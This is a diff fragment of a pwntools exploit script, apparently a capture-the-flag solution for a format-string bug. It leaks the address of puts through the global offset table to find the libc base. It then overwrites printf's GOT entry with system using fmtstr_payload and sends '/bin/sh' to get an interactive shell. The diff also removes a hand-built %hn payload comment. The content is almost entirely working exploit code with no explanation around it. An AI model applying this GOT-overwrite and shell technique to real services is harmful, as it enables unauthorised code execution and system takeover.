@@ -215,8 +215,9 @@ io.recvuntil(b"Welcome:\n")
 io.send(b"%9$sEND_" + p64(puts_got))
 leak=u64(io.recvuntil(b"END_", drop=True).ljust(8, b"\x00"))
 libc.address=leak-libc.sym["puts"]
-payload2=fmtstr_payload(8,{printf_got:libc.sym["system"]},write_size="short")#或者payload2=%29666c%14$hn%2046c%15$hn%21061c%16$hnAAAAAAAAAA
+payload2=fmtstr_payload(8,{printf_got:libc.sym["system"]},write_size="short")
 io.send(payload2)
+io.sleep(0.2)
 io.clean()        
 io.send(b"/bin/sh\x00")
 io.interactive()
